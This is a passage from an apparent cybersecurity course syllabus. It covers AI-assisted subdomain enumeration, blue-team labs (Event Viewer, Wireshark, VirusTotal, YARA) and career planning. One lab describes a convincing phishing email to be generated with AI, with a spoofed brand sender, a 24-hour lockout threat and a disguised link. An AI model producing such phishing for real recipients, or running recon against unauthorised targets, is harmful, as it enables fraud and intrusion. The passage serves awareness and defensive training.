Use a local/AI model to help generate and refine a subdomain enumeration script, then run it against a lab target — building directly on the M12 subdomain brute-forcer by asking the AI to add concurrency, better error handling, and comparing the result against the original manual version.

**Key Points:**

- Baseline script pattern being extended: a Python script takes a domain, iterates over a candidate list of common subdomain prefixes (e.g. www, mail, ftp, admin, test, dev), sends an HTTP GET to each `sub.domain` with a short timeout, and prints any that respond with a 200 status — this is the manual version the lab upgrades with AI help
- Ask the AI model to extend the M12 subdomain script with concurrency/threading so candidate subdomains are checked in parallel instead of one at a time, and to handle connection errors gracefully
- Review every AI-suggested change line by line before running it — confirm it isn't silently expanding scope (e.g. adding requests to hosts outside the target domain) or introducing insecure patterns
- Compare the AI-assisted version's speed and accuracy against the original sequential script when run against the same lab target
- This mirrors the documented ethical-hacking workflow for using a local AI model: generate a script for a recon task, ask it to add comments/error handling/exception handling, but validate all output manually and never run unreviewed automation against a target
- Subdomains matter because they often expose services not on the main site — login pages, admin panels, dev/staging environments — making enumeration valuable for both offensive recon and defensive attack-surface review

**Resources:**

- [Ollama](https://ollama.com) _(tool)_
- [Requests library docs](https://requests.readthedocs.io) _(link)_
- [SecLists](https://github.com/danielmiessler/SecLists) _(tool)_

**Quick Quiz:**

1. What is this lab's core exercise, building on the M12 subdomain brute-forcer?
   - **Using AI to help extend the M12 script with concurrency/threading** ✓
   - Rewriting the script from scratch in a different programming language
   - Replacing the subdomain script with a paid commercial scanner
   - Disabling error handling to make the script run faster
   > The lab specifically asks students to ask an AI model to extend the M12 subdomain script with concurrency/threading, building directly on the earlier module.
2. What should you do with every AI-suggested code change in this lab, per its key points?
   - **Review it line by line before running it** ✓
   - Run it immediately without reading it, to save time
   - Only review it if it fails on the first attempt
   - Skip review since the AI model already tested it
   > The lab explicitly instructs reviewing every suggested change line by line before execution, consistent with the module's broader theme of validating AI output.
3. What comparison does this lab ask you to make at the end?
   - **The AI-assisted version's speed/accuracy against the original manual version** ✓
   - The AI model's licensing cost versus a competitor's
   - The number of lines of code versus the M11 hashcat lab
   - The AI model's response time versus a human typing speed
   > The lab asks students to compare the AI-assisted script's speed and accuracy against the manually written version from M12.

#### 161. Lab: Writing phishing email templates with AI (awareness exercise) `[lab]` — Week 11

Generate a sample phishing email with AI purely as a security-awareness exercise, then annotate exactly which elements make it convincing — using the documented pattern of an AI-generated phishing email as the reference example.

**Key Points:**

- Generate an email impersonating a known brand with an urgency-driven call to action, following the documented pattern: a fake '[ACTION REQUIRED] Security Alert' from a spoofed sender (e.g. security@paypal-alert.com) claiming an unauthorised login was detected and the account temporarily locked, pressuring a click within 24 hours before 'permanent suspension'
- Annotate the manipulation techniques present: urgency (a 24-hour deadline), authority/fake branding (impersonating a trusted company), fear (account suspension threat), and a disguised call-to-action link
- Cross-reference the generated email against the phishing taxonomy (Vishing, Smishing, Whaling, Clone phishing, Email phishing, Spear phishing) to identify which category it falls into based on how targeted and personalised it is
- Note what AI changed versus older scam emails: no spelling/grammar errors, more natural tone, personalisation — the exact tells defenders used to rely on are gone
- Pair the exercise with defensive takeaways: evaluate the same email against protections like enabling 2FA, verifying via a separate channel, and never clicking embedded links — reinforcing why awareness training matters
- This exercise is for awareness/training content only — never send generated phishing content to real people outside an authorised, scoped engagement

**Resources:**

- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) _(link)_
- [Have I Been Pwned](https://haveibeenpwned.com) _(tool)_
- [SANS Security Awareness Training](https://www.sans.org/for-organizations/workforce/security-awareness-training) _(link)_

**Quick Quiz:**

1. What is the actual purpose of generating a phishing email with AI in this lab?
   - **A security-awareness exercise to annotate which elements make phishing convincing, not to target real people** ✓
   - To send it to real employees at a partner company for testing
   - To sell the template to spammers as a proof of concept
   - To submit it as a bug bounty report against an email provider
   > The lab is explicit that this exercise is for awareness/training content only, and generated phishing content must never be sent to real people outside an authorised, scoped engagement.
2. Which manipulation techniques are you asked to annotate in the generated phishing email?
   - **Urgency, authority, fear, and fake branding** ✓
   - Grammar mistakes and spelling errors only
   - The email's file size and character count
   - The sender's IP geolocation
   > The lab specifically calls out urgency, authority, fear, and fake branding as the manipulation techniques to identify and annotate.
3. What kind of call-to-action does the lab suggest the generated email should include?
   - **An urgency-driven call to action impersonating a known brand** ✓
   - A calm, no-deadline request with no branding at all
   - A request that requires no user action whatsoever
   - A technical CVE disclosure with no persuasive element
   > The lab instructs generating an email that impersonates a known brand with an urgency-driven call to action, mirroring how real phishing campaigns operate.


---

## M14: Blue Team / Defensive Security Intro

**Month 3** · Week 12 · 8 topics

Every good offensive tester understands the defender's side too — this module covers SOC structure, the core blue-team disciplines, and three hands-on investigation labs (Event Viewer, Wireshark, VirusTotal) that mirror what a Tier 1/2 SOC analyst does daily.

**Learning Outcomes:**

- Explain the SOC tier structure and each tier's responsibilities
- Name the key blue-team disciplines (SIEM, threat intel, IR, DFIR, IAM)
- Investigate a Windows Event Log for indicators of compromise
- Analyse a PCAP file in Wireshark to identify suspicious traffic
- Use VirusTotal to triage a suspicious file by hash

**Module Resources:**

- [TryHackMe SOC Level 1](https://tryhackme.com) _(platform)_
- [VirusTotal](https://www.virustotal.com) _(tool)_
- [Wireshark](https://www.wireshark.org) _(tool)_

**Module Quiz (10 questions):**

1. Which SOC tier would be responsible for building new detection rules after discovering a novel attack pattern during proactive hunting?
   - **Tier 3 (Threat Hunter/Advanced Analyst)** ✓
   - Tier 1 (Junior Analyst)
   - Tier 2 (Incident Responder)
   - None of the tiers build detection rules
   > Tier 3 is specifically described as proactively hunting hidden threats and building detection rules, beyond Tier 1's triage and Tier 2's containment role.
2. A SOC needs to correlate login logs, firewall logs, and endpoint logs to spot a coordinated attack pattern. Which blue-team discipline is this?
   - **SIEM** ✓
   - IAM
   - DFIR
   - Threat Intelligence
   > SIEM's defining function is aggregating and correlating logs across the organisation to detect suspicious patterns, exactly this scenario.
3. Digital evidence from a compromised server needs to be preserved and analysed for a potential legal case. Which discipline handles this specifically?
   - **DFIR (Digital Forensics & Incident Response)** ✓
   - IAM
   - SIEM
   - General Incident Response only, with no forensic component
   > DFIR is defined as deep technical investigation after an incident, often specifically for legal/evidentiary purposes, beyond general IR.
4. In the Event Viewer lab, what does discovering both Event ID 4657 and Event ID 1074 together suggest happened on the host?
   - **A registry key was modified, and the system was later shut down — consistent with malware altering a Run key that triggers reboots** ✓
   - Only a normal software update occurred, with no suspicious activity
   - The machine was never actually compromised
   - Event ID 1074 always occurs before 4657, reversing the actual timeline
   > The lab's reconstructed timeline is exactly this: a registry change (4657) tied to malware persistence, followed by shutdown events (1074) triggered by every login.
5. In the Wireshark lab, why check Statistics before diving into individual packets?
   - **To quickly spot unusual source/destination IPs or protocol patterns that narrow down where to focus deeper analysis** ✓
   - Because Statistics automatically decrypts all TLS traffic
   - Because individual packets cannot be viewed without first opening Statistics
   - Because Statistics is required to export the PCAP file
   > Statistics gives a fast overview that helps identify which conversation or IP is worth following in detail, rather than manually scanning every packet.
6. A suspicious binary returns a 'clean' VirusTotal result. What is the appropriate interpretation per this module?
   - **Treat it as inconclusive, since brand-new malware strains can evade AV engine detection** ✓
   - Treat it as definitive proof the file is safe to execute anywhere
   - Immediately delete VirusTotal's verdict and re-scan with a different hash
   - Assume the file has been personally reviewed by a VirusTotal analyst
   > The lab explicitly warns that a clean VT result is inconclusive, not proof-of-safety, since brand-new strains can be missed.
7. Which phase of the Incident Response lifecycle involves determining the scope of an ongoing incident?
   - **Detect & Analyse** ✓
   - Prepare
   - Contain, Eradicate, Recover
   - Post-Incident
   > Detect & Analyse is specifically the phase for identifying that an incident is happening and understanding its scope, before containment begins.
8. A YARA rule with a Computed IOC type is written to catch malware samples. What is it most likely matching on?
   - **A fuzzy hash that tolerates minor variations between related malware samples** ✓
   - An exact IP address used by a C2 server
   - A specific behavioural code pattern
   - A hardcoded username
   > Computed IOCs are specifically described as fuzzy hashes, distinct from Atomic (exact hash/IP) and Behavioural (code pattern) types.
9. Why is IAM considered a distinct blue-team discipline from SIEM, even though both relate to monitoring/security?
   - **IAM governs who can access what and enforces least privilege, while SIEM aggregates and correlates logs to detect suspicious activity** ✓
   - IAM and SIEM are simply two names for the same discipline
   - IAM only applies to physical building access, not systems
   - SIEM enforces least privilege, while IAM aggregates logs
   > IAM is about access governance (who can do what), while SIEM is about log aggregation/correlation — related but distinct disciplines.
10. A pentester wants to think more realistically about how their attack would be detected. Which of this module's areas would most directly help them anticipate defender response?
   - **Understanding the SOC tier structure and incident lifecycle** ✓
   - Learning more Hashcat attack modes
   - Studying msfvenom payload encoding options
   - Memorising more Nmap scan flags
   > This module's core argument is that understanding SOC structure and the IR lifecycle sharpens a pentester's sense of how and when their activity would actually be detected and escalated.

### Topics

#### 162. Defensive Security Overview & Why Pentesters Should Understand It `[theory]` — Week 12

Defensive security is the practice of protecting an organization's digital assets, networks, and systems from cyber threats, and it boils down to two concrete tasks: preventing intrusions from happening, and detecting intrusions when they do happen and responding properly. The source material frames it as building a strong defence system for a castle — walls, guards, and alarms to keep intruders out and respond quickly when they get through. It spans seven concrete areas of a real security programme, sits in direct contrast to offensive security (which simulates the attacks defensive security exists to stop), and understanding it makes a pentester sharper: you learn exactly what controls, monitoring, and response processes you're actually up against on an engagement.

**Key Points:**

- Two core tasks only: preventing intrusions from occurring, and detecting + properly responding to intrusions once they occur
- Seven key areas: Network Security (firewalls, IDS/IPS, VPNs), Endpoint Security (EDR), Application Security (patching software flaws), Identity & Access Management (MFA, least privilege), Threat Intelligence, Incident Response, and Security Awareness Training (phishing/password/social-engineering education)
- Defensive vs offensive security: defensive uses firewalls/antivirus/monitoring and focuses on prevention, detection, incident response and threat intel; offensive uses pentesting, red teaming, and exploit development and focuses on simulating attacks against those same defences
- Why it matters: prevents data breaches and cyberattacks, ensures compliance with regulations like GDPR and ISO 27001, protects business reputation/customer trust, and reduces financial losses from cyber incidents
- The castle analogy maps directly onto real controls: walls/guards/alarms are layered defensive controls that keep intruders out and let defenders respond fast when a layer is breached

**Resources:**

- [MITRE ATT&CK](https://attack.mitre.org) _(link)_
- [OWASP](https://owasp.org) _(link)_
- [TryHackMe](https://tryhackme.com) _(platform)_

**Quick Quiz:**

1. Which analogy does this topic use to describe the relationship between offensive and defensive security?
   - **Defensive security is the 'castle' to offensive security's 'siege'** ✓
   - Defensive security is the 'sword' to offensive security's 'shield'
   - They are described as entirely unrelated disciplines
   - Defensive security is described as obsolete compared to offensive security
   > The topic explicitly uses the castle-vs-siege analogy to frame defensive security as protecting assets against offensive attack.
2. Which of these is listed as a core defensive security area in this topic?
   - **Identity and Access Management (IAM)** ✓
   - Payload staging
   - Password spraying
   - SUID binary abuse
   > IAM is listed alongside Network Security, Endpoint Security, Application Security, Threat Intelligence, Incident Response, and Security Awareness Training as core defensive areas.
3. Why does this topic argue pentesters should understand defensive security?
   - **It makes them a sharper, more realistic attacker by understanding what defenders actually look for** ✓
   - It's a legal requirement to hold any pentesting certification
   - It replaces the need to learn offensive tools entirely
   - It's only relevant to SOC analysts, not pentesters
   > Understanding the defender's perspective helps a pentester anticipate detection and think more realistically about how an attack would actually be seen and stopped.

#### 163. SOC Structure (Tier 1/2/3 analyst, incident lifecycle) `[theory]` — Week 12

A Security Operations Center (SOC) is the team of cybersecurity professionals that continuously monitors, detects, analyses, and responds to threats within an organization 24/7 — the org's first line of defence. Its responsibilities go beyond just watching alerts: continuous monitoring of networks/endpoints/cloud, threat detection & analysis, incident response, vulnerability management, log & data analysis, and compliance/reporting (e.g. GDPR, ISO 27001). Inside the SOC, analysts are organised into three escalating tiers of expertise, each with distinct day-to-day duties and tooling.

**Key Points:**

- SOC's six core responsibilities: continuous 24/7 monitoring of networks/endpoints/cloud, threat detection & analysis, incident response, vulnerability management, log & data analysis (from firewalls, IDS/IPS, SIEM), and compliance/reporting
- Tier 1 (Junior Analyst / first responder): monitors SIEM tools, reviews and triages security alerts, escalates serious threats to higher tiers
- Tier 2 (Incident Responder): investigates threats in depth, analyses suspicious activity and malware, correlates logs and alerts to confirm real threats, responds to and contains incidents
- Tier 3 (Threat Hunter / Advanced Analyst): proactively hunts hidden threats, conducts deep forensic investigations, and develops detection rules for previously-unknown threats
- A mature SOC also includes a SOC Manager (defines security policies and IR plans, manages staff/resources, reports incidents to management), a Forensics Expert (examines malware/logs/compromised systems, recovers deleted files, supports legal investigations), a Threat Intelligence Analyst (tracks threat-actor groups and TTPs, monitors dark-web activity), and a Security Engineer (configures/tunes SIEM, IDS/IPS and firewalls, builds automation for faster response)
- Why a SOC matters: it detects attacks before they cause harm, reduces the impact of incidents that do occur, supports regulatory compliance, and provides continuous monitoring with a fast response loop

**Resources:**

- [TryHackMe](https://tryhackme.com) _(platform)_
- [NIST SP 800-61: Computer Security Incident Handling Guide](https://csrc.nist.gov/pubs/sp/800/61/r2/final) _(link)_
- [MITRE ATT&CK](https://attack.mitre.org) _(link)_

**Quick Quiz:**

1. What is the primary responsibility of a Tier 1 SOC analyst, per this topic?
   - **First responder who monitors SIEM alerts and triages/escalates serious threats** ✓
   - Building detection rules and proactively hunting hidden threats
   - Conducting deep forensic investigations for legal proceedings
   - Setting overall company security budget and policy
   > Tier 1 is described as the first responder, monitoring alerts and triaging/escalating anything serious to higher tiers.
2. Which tier is responsible for investigating threats in depth and containing incidents?
   - **Tier 2 (Incident Responder)** ✓
   - Tier 1 (Junior Analyst)
   - Tier 3 (Threat Hunter)
   - None of the tiers handle containment
   > Tier 2 is described as investigating threats in depth, analysing malware/suspicious activity, and containing incidents.
3. What distinguishes Tier 3 from Tiers 1 and 2 in this SOC structure?
   - **Tier 3 proactively hunts hidden threats and performs deep forensic investigation, rather than reacting to alerts** ✓
   - Tier 3 only handles password resets and account unlocks
   - Tier 3 has no interaction with SIEM data at all
   - Tier 3 is responsible solely for physical security
   > Tier 3 is the proactive, advanced tier: threat hunting and deep forensics, building detection rules rather than just responding to triaged alerts.

#### 164. Key Blue Team Areas (SIEM, Threat Intel, IR, DFIR, IAM) `[theory]` — Week 12

Blue-team work is really a set of specialist disciplines staffed by different roles rather than one generic 'defender' job. SIEM, threat intelligence, incident response, DFIR, and IAM each map to a role with distinct day-to-day actions — understanding who does what (and with which tools) shows how these disciplines interlock in a real SOC.

**Key Points:**

- SIEM work is owned by Tier 1/2 SOC analysts, who monitor SIEM tools and correlate logs/alerts across the org to detect suspicious patterns and confirm real threats
- Threat Intelligence is a dedicated role (Threat Intelligence Analyst): tracks cybercriminal groups and their TTPs, monitors dark-web forums and hacker activity, and keeps the SOC ahead of emerging threats
- Incident Response is owned by the Incident Responder: investigates and contains security incidents, collects forensic evidence, determines the attack method, then restores affected systems and implements security fixes
- DFIR is the Forensics Expert's territory: examines malware, logs, and compromised systems, recovers deleted files, traces attacker activity, and supports legal investigations with digital evidence
- IAM enforces least privilege and MFA so only authorized users can reach systems — one of the seven key defensive-security areas alongside network, endpoint, and application security
- A Security Engineer maintains the infrastructure all of the above rely on: configuring/tuning SIEM, IDS/IPS, and firewalls, and writing automation scripts for faster incident response
- Threat Hunters (Tier 3) close the gap other disciplines miss: they proactively search for signs of APT activity and zero-day exploits using threat intel plus behavioural analysis, rather than waiting for an alert

**Resources:**

- [MITRE ATT&CK](https://attack.mitre.org) _(link)_
- [NIST SP 800-61: Computer Security Incident Handling Guide](https://csrc.nist.gov/pubs/sp/800/61/r2/final) _(link)_
- [TryHackMe](https://tryhackme.com) _(platform)_

**Quick Quiz:**

1. What is the primary function of a SIEM in a blue team programme?
   - **Aggregating and correlating logs across the organisation to detect suspicious patterns** ✓
   - Cracking password hashes offline
   - Generating phishing email templates for awareness training
   - Automatically patching vulnerable software
   > SIEM (Security Information and Event Management) is described as the discipline that aggregates and correlates logs org-wide to surface suspicious patterns.
2. What distinguishes DFIR from general Incident Response (IR)?
   - **DFIR involves deep technical investigation after an incident, often for legal/evidentiary purposes** ✓
   - DFIR only handles employee onboarding and access provisioning
   - DFIR is a synonym for IR with no distinct scope
   - DFIR is exclusively concerned with real-time alert triage
   > IR is the structured process for handling an active incident, while DFIR is described as the deeper forensic investigation that follows, often needed for legal evidence.
3. What does IAM (Identity and Access Management) govern?
   - **Who can access what, enforcing the principle of least privilege** ✓
   - Which malware signatures are loaded into the antivirus engine
   - Which network segments are reachable from the internet
   - How log retention periods are configured in the SIEM
   > IAM is described as governing access rights and enforcing least privilege, distinct from SIEM (logging) or threat intelligence (IOCs/TTPs).

#### 165. Lab: Log Analysis with Windows Event Viewer `[lab]` — Week 12

This lab reconstructs a real malware-infection timeline purely from Windows Event Viewer logs - the built-in Windows tool that displays a log of system events, including errors, warnings, and informational messages, to help troubleshoot and monitor a system - and assumes basic Windows OS knowledge, event log concepts, and basic security knowledge going in. The scenario: an employee downloaded and ran an installer that appeared to do nothing, and now every login is followed by a black command-prompt flash and an instant shutdown. With roughly 8,000 log entries in the provided Windows_logs.evtx, scrolling isn't viable — the lab teaches filtering by Event ID to jump straight to the installation, the malicious registry modification, and the resulting shutdown, recovering a 3-part flag along the way.

**Key Points:**

- Load Windows_logs.evtx into Event Viewer's Saved Logs pane (not the live Windows Logs / Application and Services Logs) since it's a captured, not a running, system
- With ~8,000 entries, filter by Event ID instead of scrolling — each Event ID is a unique number identifying a specific kind of logged event
- Event IDs 11707 and 1033 are MSI installation events; 1033's message template is `Product: %1. Version: %2. Language: %3. Installation completed with status: %4. Manufacturer: %5.` — this surfaced the installer (Totally_Legit_Software.msi) and the first flag fragment in the Manufacturer field
- Event ID 4657 logs registry key changes — it revealed the Run key had been modified to trigger an immediate shutdown, yielding the second flag fragment
- Event ID 1074 logs every system shutdown, confirming the malicious behaviour and yielding the final flag fragment
- Reconstructed timeline: a suspicious MSI installer was run -> it modified the Run registry key -> from then on every login triggers the shutdown command
- Lab prerequisites: basic Windows OS knowledge, event log concepts, and basic security knowledge
- Event Viewer's layout: loaded logs (e.g. Saved Logs) sit on the left, a brief event summary plus more detailed output sit in the center, and options to create custom views and filter data sit on the right

**Resources:**

- [Microsoft Learn: Event 4657 (registry value modified)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657) _(link)_
- [Microsoft Learn: Audit Registry](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-registry) _(link)_
- [TryHackMe](https://tryhackme.com) _(platform)_

**Quick Quiz:**

1. How should the provided .evtx file be examined in Event Viewer, per this lab?
   - **Load it into Event Viewer's Saved Logs pane, rather than reading it as a live log** ✓
   - Convert it to a .txt file before opening it in Notepad
   - Rename it to .log so Event Viewer will recognise it
   - Open it directly with Wireshark instead of Event Viewer
   > The lab specifically directs loading the .evtx into the Saved Logs pane, since this is a provided file for investigation rather than the machine's own live event log.
2. Which Event ID in this lab corresponds to a registry key change?
   - **4657** ✓
   - 1074
   - 11707
   - 1033
   > The lab lists 4657 as the registry key change event, while 1074 is the shutdown event and 11707/1033 relate to installation events.
3. What is the reconstructed timeline of the malware infection in this lab?
   - **Suspicious software installed -> it modified a Run registry key -> every login now triggers a shutdown** ✓
   - A shutdown occurred first, which then triggered a malicious installation
   - A registry key changed with no installation event ever occurring
   - The malware was installed, uninstalled, and reinstalled twice
   > The lab's key points describe the exact chain: installation, followed by a Run key modification, followed by a shutdown triggered at every subsequent login.

#### 166. Lab: Network Traffic Analysis with Wireshark (PCAP file) `[lab]` — Week 12

This lab analyses a captured conversation between two hosts stored in a .pcap (packet capture) file to recover a hidden, obfuscated flag, and assumes basic networking concepts, packet structure knowledge, security awareness, and basic Wireshark familiarity going in. The underlying principle: network packets are visible to anyone on the wire, but most traffic is safe in practice because it's encrypted (HTTPS); protocols like FTP and HTTP that don't encrypt can be read directly, and even encrypted traffic can be decrypted with the right algorithm/key (e.g. an SSL certificate). The workflow moves from a high-level statistics view down to the literal bytes of one TCP conversation.

**Key Points:**

- Packets sent over a network can be seen by anyone on that network — this is usually not a problem because most traffic (HTTPS) is encrypted, but FTP/HTTP traffic is sent in the clear and can be read directly
- Even encrypted traffic can be decrypted if you have the encryption key/algorithm — e.g. having the SSL certificate for an HTTPS session
- Start with the Statistics view to see source/destination IPs and protocol breakdown across the whole capture — this is where an unexpected/unknown source IP would stand out first
- Identify the 3-way TCP handshake followed immediately by an HTTP GET request between the two hosts
- Right-click the relevant packet -> Follow -> TCP Stream to reconstruct the full request/response conversation in one colour-coded, readable view
- The flag text inside the stream was ROT13-obfuscated — recognising that specific obfuscation pattern and decoding it recovers the flag
- Lab prerequisites: basic networking concepts, packet structure knowledge, security awareness, and basic Wireshark familiarity
- .pcap stands for "packet capture" — the file format network captures of a conversation between two hosts are usually stored in

**Resources:**

- [Wireshark](https://www.wireshark.org) _(tool)_
- [Wireshark Documentation](https://www.wireshark.org/docs/) _(link)_
- [CyberChef](https://gchq.github.io/CyberChef/) _(tool)_

**Quick Quiz:**

1. What should you check first when opening the provided PCAP in Wireshark, per this lab?
   - **The Statistics view, for anything unusual in source/destination IPs and protocol breakdown** ✓
   - The final packet in the capture, ignoring everything before it
   - The PCAP's file size in bytes
   - The DNS response times only
   > The lab recommends starting with the Statistics view to spot unusual IPs or protocol patterns before diving into individual packets.
2. What does 'Follow -> TCP Stream' let you do in Wireshark?
   - **View the full request/response conversation between two hosts as a reassembled stream** ✓
   - Automatically decrypt any TLS traffic in the capture
   - Block the selected IP address from further capture
   - Export the PCAP file to a different capture format
   > Follow TCP Stream reassembles all the packets of one TCP conversation into a single readable view of the full request/response exchange.
3. What obfuscation technique does the flag in this lab's traffic use, and how is it resolved?
   - **ROT13-style obfuscation, decoded to recover the flag** ✓
   - AES-256 encryption, requiring a private key to decrypt
   - Base64 encoding of an image file
   - No obfuscation at all; the flag is sent in plaintext with no encoding
   > The lab specifically calls out recognising ROT13-style obfuscation in the stream content and decoding it to recover the hidden flag.

#### 167. Lab: Malware Detection with VirusTotal `[lab]` — Week 12

This lab walks through triaging a suspicious binary the way a Tier 1/2 analyst would - assuming basic malware knowledge, an understanding of files and hashing, and static file analysis basics going in: identify the file type, hash it, and submit that hash (VirusTotal also accepts a URL or the file itself) to VirusTotal's multiple scan engines, referred to in the source material as "Contributors", for a multi-engine verdict rather than trying to reverse-engineer it from scratch. The sample here turned out to be a Mirai-family Trojan — malware that hijacks networked Linux devices into a remotely-controlled botnet for large-scale attacks.

**Key Points:**

- `file suspicious.elf` identified the sample as a stripped, statically-linked 32-bit ELF binary (Renesas SH architecture, SYSV) — stripped meaning no debug symbols, which limits easy static analysis
- `sha256sum suspicious.elf` produced the hash actually submitted to VirusTotal rather than uploading the binary itself
- VirusTotal returned 18 positive detections out of its scanning engines and flagged the sample as a Trojan belonging to the Mirai family
- Mirai turns networked Linux devices into remotely-controlled bots used as part of a botnet for large-scale network attacks
- VirusTotal's Details tab surfaces useful triage context beyond the verdict: binary architecture, stripped/no-debug-symbols status, and the date the sample was first submitted
- Explicit caveat from the source material: VirusTotal is excellent for preliminary analysis but is often unable to detect completely new malware strains — treat a clean or low-detection result skeptically and do a more thorough analysis of the sample when possible
- Lab prerequisites: basic malware knowledge, understanding of files & hashing, and static file analysis basics
- VirusTotal accepts three submission types — a URL, a file, or just the file's hash — and calls its scanning engines "Contributors"

```bash
file suspicious.elf
sha256sum suspicious.elf
```

**Resources:**

- [VirusTotal](https://www.virustotal.com) _(tool)_
- [VirusTotal Documentation](https://docs.virustotal.com) _(link)_

**Quick Quiz:**

1. What is the purpose of running `sha256sum suspicious.elf` before submitting the file to VirusTotal?
   - **To compute the file's hash, which can be submitted to VirusTotal without necessarily uploading the full binary** ✓
   - To permanently delete the file after analysis
   - To decompile the binary into readable source code
   - To encrypt the file before transfer
   > sha256sum computes a hash that can be looked up on VirusTotal, letting you check a file's reputation by hash without always needing to upload the binary itself.
2. What does VirusTotal actually provide when you submit a file or hash?
   - **Aggregated verdicts from dozens of antivirus engines** ✓
   - A single binary verdict from one proprietary engine only
   - A guaranteed determination of whether the file is malicious
   - Automatic removal of any detected malware from your system
   > VirusTotal's core value is aggregating detections across many different AV engines rather than relying on just one engine's opinion.
3. Why should a 'clean' VirusTotal result be treated as inconclusive rather than proof-of-safety?
   - **Because VirusTotal can miss brand-new malware strains that AV engines haven't yet been updated to detect** ✓
   - Because VirusTotal never actually scans the file, only its filename
   - Because VirusTotal only checks files smaller than 1KB
   - Because a clean result always means the file has been verified by a human analyst
   > The lab explicitly warns that VirusTotal is excellent for triage but can miss brand-new strains, so a clean result doesn't guarantee the file is actually safe.

#### 168. Incident Response Lifecycle (Prepare, Detect, Contain, Eradicate, Recover) `[theory]` — Week 12

The Incident Response lifecycle is the structured sequence a SOC actually executes once something goes wrong, and the source material spells out the concrete actions behind each stage through the Incident Responder role and the SOC's own incident-response responsibility, rather than leaving it abstract.

**Key Points:**

- The SOC's core incident-response responsibility is investigating and mitigating security incidents before they cause major damage — one of its six defining functions alongside monitoring, detection, vulnerability management, log analysis, and compliance
- Detect & Analyse / Contain: the Incident Responder investigates and contains the security incident — this is where suspicious activity is confirmed and stopped from spreading
- Eradicate: the Incident Responder collects forensic evidence and determines the attack method, i.e. establishes exactly how the attacker got in and what they did before removing the cause
- Recover: the Incident Responder restores affected systems and implements security fixes so normal operations resume without the same gap reopening
- Tier 2 analysts handle day-to-day containment; Tier 3 threat hunters feed the lifecycle forward by developing detection rules so the same technique triggers an earlier response next time
- The Forensics Expert supports the later stages specifically: examining malware/logs/compromised systems, recovering deleted files, and tracing attacker activity for legal/evidentiary purposes
- Why this matters for a pentester: it's the same investigate -> contain -> eradicate -> restore sequence your own actions trigger if an engagement is detected, so knowing it helps you anticipate defender reaction time

**Resources:**

- [NIST SP 800-61: Computer Security Incident Handling Guide](https://csrc.nist.gov/pubs/sp/800/61/r2/final) _(link)_
- [MITRE ATT&CK](https://attack.mitre.org) _(link)_

**Quick Quiz:**

1. What is the correct order of phases in the Incident Response lifecycle covered in this topic?
   - **Prepare -> Detect & Analyse -> Contain, Eradicate, Recover -> Post-Incident (Lessons Learned)** ✓
   - Detect -> Prepare -> Recover -> Eradicate -> Contain
   - Contain -> Prepare -> Detect -> Eradicate -> Recover
   - Eradicate -> Recover -> Detect -> Prepare -> Contain
   > The lifecycle moves from readiness (Prepare) through detection/analysis, containment/eradication/recovery, and finally documented lessons learned.
2. What happens during the 'Prepare' phase specifically?
   - **Policies, tooling, and training are put in place before an incident occurs** ✓
   - The threat is actively removed from all affected systems
   - Normal operations are restored across the organisation
   - A detailed forensic timeline of the attack is documented
   > Prepare is the readiness phase: getting policies, tools, and training in place ahead of time, before any incident happens.
3. What is the purpose of the Post-Incident (Lessons Learned) phase?
   - **To document what happened and improve defences/playbooks going forward** ✓
   - To notify only the attacker of the organisation's findings
   - To immediately delete all incident-related logs
   - To skip documentation and move directly to the next incident
   > Lessons Learned is explicitly about documenting the incident and using it to improve future defences and response playbooks.

#### 169. YARA Rules Introduction `[theory]` — Week 12

YARA is a pattern-matching tool for identifying and classifying malware samples based on strings and code patterns — 'grep for malware researchers.'

**Key Points:**

- A YARA rule defines strings/patterns plus a boolean condition for when a file matches
- Used heavily in threat intelligence and malware research to tag families of related samples
- IOC types a rule can encode: Atomic (a hash/IP), Computed (a fuzzy hash), Behavioural (a code pattern)

```bash
rule ExampleRule {
  strings:
    $a = "malicious_string"
  condition:
    $a
}
```

**Resources:**

- [YARA Documentation](https://yara.readthedocs.io) _(link)_
- [Awesome YARA](https://github.com/InQuest/awesome-yara) _(tool)_

**Quick Quiz:**

1. How does this topic describe YARA in one line?
   - **'Grep for malware researchers' — a pattern-matching tool for identifying and classifying malware samples** ✓
   - A GPU-accelerated password cracking tool
   - A network traffic capture and analysis tool
   - A vulnerability scanner for web applications
   > The topic's own description frames YARA as 'grep for malware researchers,' matching strings/patterns to identify and classify malware.
2. What two components make up a YARA rule?
   - **Strings/patterns to match, plus a boolean condition for when a file matches** ✓
   - A network port and a protocol name
   - A username and password pair
   - A CVE ID and a CVSS score
   > A YARA rule defines the strings section (patterns to look for) and a condition section (the boolean logic for a match), as shown in the example rule.
3. Which IOC type does a YARA rule encode when it matches a fuzzy hash rather than an exact value?
   - **Computed** ✓
   - Atomic
   - Behavioural
   - Static
   > The topic lists Atomic (a hash/IP), Computed (a fuzzy hash), and Behavioural (a code pattern) as the three IOC types a YARA rule can encode.


---

## M15: Careers & Certifications

**Month 3** · Week 12 · 6 topics

The programme's closing module — mapping what you've learned onto real career paths, certification roadmaps, and the communities (CTFs, bug bounty) where you'll keep growing after week 12.

**Learning Outcomes:**

- Identify cybersecurity career roles that match your interests
- Plan a certification roadmap from entry-level to advanced
- Understand how to start building a public portfolio
- Know where to find bug bounty programmes and CTF competitions

**Module Resources:**

- [roadmap.sh/cyber-security](https://roadmap.sh/cyber-security) _(link)_
- [TryHackMe](https://tryhackme.com) _(platform)_
- [Hack The Box](https://www.hackthebox.com) _(platform)_

**Module Quiz (10 questions):**

1. Following this module's certification roadmap, which certification would a learner most likely pursue immediately after eJPT?
   - **CEH or PNPT** ✓
   - OSEP
   - A senior architect role with no further certification
   - Security+ retroactively, before eJPT
   > The roadmap sequence given is eJPT -> CEH/PNPT -> OSCP -> OSEP, so CEH/PNPT is the next step after eJPT.
2. Why might an entry-level candidate pursue CompTIA Security+ even if their long-term goal is a red team role?
   - **It's a vendor-neutral baseline often required as a minimum by employers, even for roles needing deeper offensive skills later** ✓
   - It fully substitutes for OSCP and eliminates the need for further certifications
   - It is only relevant for blue team careers and irrelevant to red teamers
   - It has no relevance to hiring processes in any sector
   > Security+ is described as a widely-required baseline credential, even in job postings for roles that ultimately need deeper offensive skills.
3. A learner has completed several VulnMachines boxes and wants to convert that into something employers can see. What does this module recommend?
   - **Publish write-ups documenting the methodology, findings, and lessons learned as portfolio entries** ✓
